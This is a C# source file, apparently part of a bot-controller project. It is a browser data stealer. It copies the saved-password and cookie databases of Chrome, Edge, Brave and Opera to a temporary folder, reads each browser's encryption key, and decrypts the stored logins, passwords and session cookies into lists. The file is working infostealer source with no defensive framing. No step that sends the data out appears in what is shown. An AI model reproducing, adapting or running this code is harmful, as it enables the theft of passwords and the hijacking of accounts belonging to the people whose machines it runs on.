using Microsoft.Data.Sqlite;

namespace BotController1.Core;

public static class BrowserData
{
    public class Credential
    {
        public string Url;
        public string Username;
        public string Password;
    }

    public class CookieData
    {
        public string Domain;
        public string Name;
        public string Value;
        public bool Secure;
    }

    private static string LocalAppData =>
        Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

    private static string RoamingAppData =>
        Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

    public static List<Credential> ChromePasswords() =>
        CollectPasswords(
            Path.Combine(LocalAppData, "Google", "Chrome", "User Data", "Local State"),
            Path.Combine(LocalAppData, "Google", "Chrome", "User Data", "Default", "Login Data"),
            "chrome_login_data.db", "Chrome");

    public static List<Credential> EdgePasswords() =>
        CollectPasswords(
            Path.Combine(LocalAppData, "Microsoft", "Edge", "User Data", "Local State"),
            Path.Combine(LocalAppData, "Microsoft", "Edge", "User Data", "Default", "Login Data"),
            "edge_login_data.db", "Edge");

    public static List<Credential> BravePasswords() =>
        CollectPasswords(
            Path.Combine(LocalAppData, "BraveSoftware", "Brave-Browser", "User Data", "Local State"),
            Path.Combine(LocalAppData, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data"),
            "brave_login_data.db", "Brave");

    public static List<Credential> OperaPasswords() =>
        CollectPasswords(
            Path.Combine(RoamingAppData, "Opera Software", "Opera Stable", "Local State"),
            Path.Combine(RoamingAppData, "Opera Software", "Opera Stable", "Login Data"),
            "opera_login_data.db", "Opera");

    public static List<CookieData> ChromeCookies() =>
        CollectCookies(
            new[]
            {
                Path.Combine(LocalAppData, "Google", "Chrome", "User Data", "Default", "Network", "Cookies"),
                Path.Combine(LocalAppData, "Google", "Chrome", "User Data", "Default", "Cookies"),
            },
            Path.Combine(LocalAppData, "Google", "Chrome", "User Data", "Local State"),
            "chrome_cookies.db", "chrome");

    public static List<CookieData> EdgeCookies() =>
        CollectCookies(
            new[]
            {
                Path.Combine(LocalAppData, "Microsoft", "Edge", "User Data", "Default", "Network", "Cookies"),
                Path.Combine(LocalAppData, "Microsoft", "Edge", "User Data", "Default", "Cookies"),
            },
            Path.Combine(LocalAppData, "Microsoft", "Edge", "User Data", "Local State"),
            "edge_cookies.db", "edge");

    public static List<CookieData> BraveCookies() =>
        CollectCookies(
            new[]
            {
                Path.Combine(LocalAppData, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Network", "Cookies"),
                Path.Combine(LocalAppData, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Cookies"),
            },
            Path.Combine(LocalAppData, "BraveSoftware", "Brave-Browser", "User Data", "Local State"),
            "brave_cookies.db", "brave");

    public static List<CookieData> OperaCookies() =>
        CollectCookies(
            new[]
            {
                Path.Combine(RoamingAppData, "Opera Software", "Opera Stable", "Network", "Cookies"),
                Path.Combine(RoamingAppData, "Opera Software", "Opera Stable", "Cookies"),
            },
            Path.Combine(RoamingAppData, "Opera Software", "Opera Stable", "Local State"),
            "opera_cookies.db", "opera");

    private static List<Credential> CollectPasswords(
        string localStatePath, string loginDbPath, string tempName, string label)
    {
        var passwords = new List<Credential>();
        try
        {
            if (!File.Exists(localStatePath) || !File.Exists(loginDbPath))
                return passwords;

            var tempDb = Path.Combine(Path.GetTempPath(), tempName);
            if (File.Exists(tempDb))
                File.Delete(tempDb);
            File.Copy(loginDbPath, tempDb);

            var key = Crypto.GetBrowserKey(localStatePath);
            using (var conn = new SqliteConnection($"Data Source={tempDb}"))
            {
                conn.Open();
                using var cmd = conn.CreateCommand();
                cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins";
                using var reader = cmd.ExecuteReader();
                while (reader.Read())
                {
                    var password = Crypto.DecryptPassword(
                        reader.IsDBNull(2) ? null : reader.GetValue(2) as byte[], key);
                    if (password == null)
                        continue;
                    passwords.Add(new Credential
                    {
                        Url = reader.IsDBNull(0) ? null : reader.GetString(0),
                        Username = reader.IsDBNull(1) ? null : reader.GetString(1),
                        Password = password,
                    });
                }
            }

            try { File.Delete(tempDb); } catch { }
        }
        catch (Exception e)
        {
            Console.WriteLine($"Error getting {label} passwords: {e}");
        }
        return passwords;
    }

    private static List<CookieData> CollectCookies(
        string[] candidates, string localStatePath, string tempName, string label)
    {
        var cookies = new List<CookieData>();
        var cookieDb = candidates.FirstOrDefault(File.Exists);
        if (cookieDb == null)
            throw new FileNotFoundException($"{label} cookie database not found");

        var tempDb = Path.Combine(Path.GetTempPath(), tempName);
        try
        {
            if (File.Exists(tempDb))
                File.Delete(tempDb);
            File.Copy(cookieDb, tempDb);

            var key = Crypto.GetBrowserKey(localStatePath);
            using (var conn = new SqliteConnection($"Data Source={tempDb}"))
            {
                conn.Open();
                using var cmd = conn.CreateCommand();
                cmd.CommandText = "SELECT host_key, name, value, encrypted_value, is_secure FROM cookies";
                using var reader = cmd.ExecuteReader();
                while (reader.Read())
                {
                    var encrypted = reader.IsDBNull(3) ? null : reader.GetValue(3) as byte[];
                    var value = Crypto.DecryptPassword(encrypted, key);
                    if (value == null)
                        value = reader.IsDBNull(2) ? "" : reader.GetString(2);
                    cookies.Add(new CookieData
                    {
                        Domain = reader.IsDBNull(0) ? "" : reader.GetString(0),
                        Name = reader.IsDBNull(1) ? "" : reader.GetString(1),
                        Value = value,
                        Secure = !reader.IsDBNull(4) && Convert.ToInt64(reader.GetValue(4)) != 0,
                    });
                }
            }

            try { File.Delete(tempDb); } catch { }
        }
        catch (Exception e)
        {
            Console.WriteLine($"Error retrieving {label} cookies: {e}");
            throw;
        }
        return cookies;
    }
}
